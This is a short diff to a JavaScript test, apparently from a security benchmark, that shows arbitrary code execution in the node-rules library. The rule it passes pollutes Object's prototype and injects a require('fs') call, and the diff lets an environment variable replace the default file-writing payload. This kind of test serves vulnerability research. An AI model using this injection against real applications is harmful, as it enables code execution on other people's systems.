@@ -8,7 +8,7 @@ test("Arbitrary code execution in node-rules", () => {
   try {
     var rules = {
       condition: "{}.__proto__.toString = 222",
-      consequence: "require(`fs`).writeFileSync(`node-rules`,``)",
+      consequence: process.env.SECBENCH_PAYLOAD || ("require(`fs`).writeFileSync(`node-rules`,``)"),
     };
     var a = new A();
     a.fromJSON(rules);
